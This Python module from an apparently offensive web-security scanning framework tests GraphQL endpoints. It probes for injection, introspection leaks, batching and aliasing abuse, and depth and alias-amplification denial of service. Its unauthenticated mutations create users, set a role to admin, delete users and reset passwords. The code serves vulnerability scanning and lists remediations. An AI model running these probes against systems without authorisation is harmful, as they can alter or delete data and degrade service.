#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - GraphQL Injection Module
Detects GraphQL introspection exposure, query injection, and mutation abuse.
"""

from config import Payloads, Colors
from modules.base import BaseModule


class GraphQLModule(BaseModule):
    """GraphQL Injection Testing Module"""

    name = "GraphQL Injection"
    vuln_type = "graphql"

    def __init__(self, engine):
        super().__init__(engine)

    def test(self, url: str, method: str, param: str, value: str):
        """Test a parameter for GraphQL injection.

        Sends GraphQL payloads as the parameter value and inspects the
        response for signs of successful query execution.
        """
        for payload in Payloads.GRAPHQL_PAYLOADS:
            try:
                response = self.requester.request(
                    url,
                    method,
                    params={param: payload},
                )
                if not response:
                    continue
                body = response.text or ""
                if self._is_graphql_response(body):
                    from core.engine import Finding

                    finding = Finding(
                        technique="GraphQL Injection",
                        url=url,
                        param=param,
                        payload=payload[:200],
                        evidence=body[:200],
                        severity="HIGH",
                        confidence=0.85,
                        mitre_id="T1190",
                        cwe_id="CWE-943",
                        cvss=7.5,
                        remediation="Disable introspection in production. Validate and sanitize all GraphQL input. Use query depth and complexity limits.",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.error(f'GraphQL test error: {e}')}")

    def test_url(self, url: str):
        """Test URL-level GraphQL endpoints for introspection leaks."""
        graphql_paths = [
            url,
            url.rstrip("/") + "/graphql",
            url.rstrip("/") + "/graphiql",
            url.rstrip("/") + "/api/graphql",
        ]

        introspection_query = '{"query":"{__schema{types{name}}}"}'

        for endpoint in graphql_paths:
            try:
                response = self.requester.request(
                    endpoint,
                    "POST",
                    headers={"Content-Type": "application/json"},
                    data=introspection_query,
                )
                if not response:
                    continue
                body = response.text or ""
                if self._is_introspection_result(body):
                    from core.engine import Finding

                    finding = Finding(
                        technique="GraphQL Introspection Enabled",
                        url=endpoint,
                        param="",
                        payload=introspection_query[:200],
                        evidence=body[:200],
                        severity="MEDIUM",
                        confidence=0.9,
                        mitre_id="T1190",
                        cwe_id="CWE-200",
                        cvss=5.3,
                        remediation="Disable GraphQL introspection in production environments. Use allowlists for permitted queries.",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.error(f'GraphQL URL test error: {e}')}")

        # Test for batching/aliasing attacks
        self._test_batching_attack(url)

        # Test for field suggestion disclosure
        self._test_field_suggestions(url)

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------

    def _test_batching_attack(self, url: str):
        """Test for GraphQL batching/aliasing attacks"""
        batch_payload = '[{"query":"{__typename}"},{"query":"{__typename}"}]'
        alias_payload = '{"query":"{a:__typename b:__typename c:__typename d:__typename e:__typename}"}'

        graphql_paths = [
            url,
            url.rstrip("/") + "/graphql",
            url.rstrip("/") + "/api/graphql",
        ]

        for endpoint in graphql_paths:
            for payload, technique in [(batch_payload, "Batching"), (alias_payload, "Aliasing")]:
                try:
                    response = self.requester.request(
                        endpoint,
                        "POST",
                        headers={"Content-Type": "application/json"},
                        data=payload,
                    )
                    if not response:
                        continue
                    body = response.text or ""
                    # Batching: response should be a JSON array with multiple results
                    # Aliasing: response should contain multiple aliased results
                    if technique == "Batching" and '"data"' in body and body.strip().startswith("["):
                        from core.engine import Finding

                        finding = Finding(
                            technique=f"GraphQL ({technique} Attack Possible)",
                            url=endpoint,
                            param="",
                            payload=payload[:200],
                            evidence=body[:200],
                            severity="MEDIUM",
                            confidence=0.8,
                            mitre_id="T1190",
                            cwe_id="CWE-799",
                            cvss=5.3,
                            remediation="Implement query batching limits and rate limiting for GraphQL.",
                        )
                        self.engine.add_finding(finding)
                        return
                    elif technique == "Aliasing" and body.count("__typename") >= 3:
                        from core.engine import Finding

                        finding = Finding(
                            technique=f"GraphQL ({technique} Attack Possible)",
                            url=endpoint,
                            param="",
                            payload=payload[:200],
                            evidence=body[:200],
                            severity="MEDIUM",
                            confidence=0.75,
                            mitre_id="T1190",
                            cwe_id="CWE-799",
                            cvss=5.3,
                            remediation="Implement query complexity limits and depth limiting for GraphQL.",
                        )
                        self.engine.add_finding(finding)
                        return
                except Exception:
                    continue

    def _test_field_suggestions(self, url: str):
        """Test for GraphQL field suggestion information disclosure"""
        # Send an invalid field name to trigger field suggestions
        suggestion_payload = '{"query":"{__schema{typo_field_xxx}}"}'

        graphql_paths = [
            url,
            url.rstrip("/") + "/graphql",
            url.rstrip("/") + "/api/graphql",
        ]

        for endpoint in graphql_paths:
            try:
                response = self.requester.request(
                    endpoint,
                    "POST",
                    headers={"Content-Type": "application/json"},
                    data=suggestion_payload,
                )
                if not response:
                    continue
                body = response.text or ""
                # GraphQL engines often suggest valid field names in error messages
                if "did you mean" in body.lower() or "suggestions" in body.lower():
                    from core.engine import Finding

                    finding = Finding(
                        technique="GraphQL (Field Suggestion Disclosure)",
                        url=endpoint,
                        param="",
                        payload=suggestion_payload[:200],
                        evidence=body[:300],
                        severity="LOW",
                        confidence=0.85,
                        mitre_id="T1190",
                        cwe_id="CWE-200",
                        cvss=3.7,
                        remediation="Disable field suggestions in production GraphQL schemas.",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception:
                continue

    @staticmethod
    def _is_graphql_response(body: str) -> bool:
        """Return True when the response body looks like a GraphQL result."""
        indicators = ['"data":', '"__schema"', '"__type"', '"errors":', '"fields"']
        return any(ind in body for ind in indicators)

    @staticmethod
    def _is_introspection_result(body: str) -> bool:
        """Return True when body contains introspection type listing."""
        return '"__schema"' in body and '"types"' in body

    # ------------------------------------------------------------------
    # Phase K: Advanced GraphQL Attacks
    # ------------------------------------------------------------------

    def _test_depth_dos(self, endpoint):
        """K1: Nested query depth attack — DoS via deeply nested query."""
        # Build a 15-level nested query
        depth = 15
        inner = "__typename"
        for _ in range(depth):
            inner = f"{{ users {{ friends {inner} }} }}"
        query = f"query {{ {inner} }}"
        payload = {"query": query}
        try:
            import time

            start = time.time()
            resp = self.requester.request(endpoint, "POST", json_data=payload)
            elapsed = time.time() - start
            if resp and elapsed > 5:
                from core.engine import Finding

                self.engine.add_finding(
                    Finding(
                        technique="GraphQL Depth DoS",
                        url=endpoint,
                        param="",
                        payload=query[:200],
                        evidence=f"Response took {elapsed:.1f}s (depth={depth})",
                        severity="HIGH",
                        confidence=0.7,
                    )
                )
        except Exception:
            pass

    def _test_alias_amplification(self, endpoint):
        """K1: Aliased query amplification — duplicate __typename 1000x."""
        aliases = " ".join(f"a{i}:__typename" for i in range(1000))
        query = f"{{ {aliases} }}"
        payload = {"query": query}
        try:
            import time

            start = time.time()
            resp = self.requester.request(endpoint, "POST", json_data=payload)
            elapsed = time.time() - start
            if resp and elapsed > 3:
                from core.engine import Finding

                self.engine.add_finding(
                    Finding(
                        technique="GraphQL Alias Amplification DoS",
                        url=endpoint,
                        param="",
                        payload=query[:200],
                        evidence=f"1000 aliases → {elapsed:.1f}s response",
                        severity="HIGH",
                        confidence=0.65,
                    )
                )
        except Exception:
            pass

    def _test_fragment_cycle(self, endpoint):
        """K1: Circular fragment references."""
        query = """
        query { ...A }
        fragment A on Query { ...B }
        fragment B on Query { ...A }
        """
        payload = {"query": query}
        try:
            resp = self.requester.request(endpoint, "POST", json_data=payload)
            if resp:
                body = resp.text or ""
                # If server doesn't reject this, it may loop
                if resp.status_code == 200 and "error" not in body.lower():
                    from core.engine import Finding

                    self.engine.add_finding(
                        Finding(
                            technique="GraphQL Fragment Cycle",
                            url=endpoint,
                            param="",
                            payload=query.strip()[:200],
                            evidence=body[:300],
                            severity="MEDIUM",
                            confidence=0.6,
                        )
                    )
        except Exception:
            pass

    def _test_mutation_auth_bypass(self, endpoint):
        """K2: Test mutations without authentication."""
        mutations = [
            'mutation { createUser(username:"test", password:"test") { id } }',
            'mutation { updateUser(id:1, role:"admin") { id role } }',
            "mutation { deleteUser(id:1) { success } }",
            'mutation { resetPassword(email:"admin@test.com") { success } }',
        ]
        for mutation in mutations:
            payload = {"query": mutation}
            try:
                resp = self.requester.request(endpoint, "POST", json_data=payload, headers={"Authorization": ""})
                if resp and resp.status_code == 200:
                    body = resp.text or ""
                    if self._is_graphql_response(body) and "error" not in body.lower():
                        from core.engine import Finding

                        self.engine.add_finding(
                            Finding(
                                technique="GraphQL Mutation Auth Bypass",
                                url=endpoint,
                                param="",
                                payload=mutation[:200],
                                evidence=body[:300],
                                severity="CRITICAL",
                                confidence=0.7,
                            )
                        )
                        return
            except Exception:
                continue
